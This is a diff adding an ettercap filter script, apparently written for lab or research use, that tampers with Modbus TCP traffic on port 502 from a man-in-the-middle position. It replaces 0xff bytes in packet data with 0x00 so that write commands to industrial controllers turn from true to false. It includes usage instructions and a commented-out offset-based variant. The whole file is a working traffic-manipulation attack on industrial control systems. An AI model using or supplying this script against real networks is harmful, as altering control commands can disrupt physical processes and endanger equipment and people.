@@ -1,0 +1,32 @@
+####
+# Usage: ettercap etter.filter etter.filter.modbus
+# then restart ettercap
+#####
+
+
+##
+# This filter will substitute the write response with false
+###
+
+
+if (ip.proto == TCP && tcp.dst == 502) {
+  msg("Searching....");
+  # start of data frame plus 76 bytes until data frame of modbus packet at
+  # 0xff00
+  if (search(DATA.data, "\xff")){
+    replace("\xff", "\x0");
+    msg("Correctly substituted and logged. \n");
+  }
+}
+
+
+
+#if (ip.proto == TCP && tcp.dst == 502) {
+#  msg("Searching....");
+#  # start of data frame plus 76 bytes until data frame of modbus packet at
+#  # 0xff00
+#  if (DATA.data + 76 ==  "\xff"){
+#    DATA.data + 76 = "\x0";
+#    msg("Correctly substituted and logged. \n");
+#  }
+#}
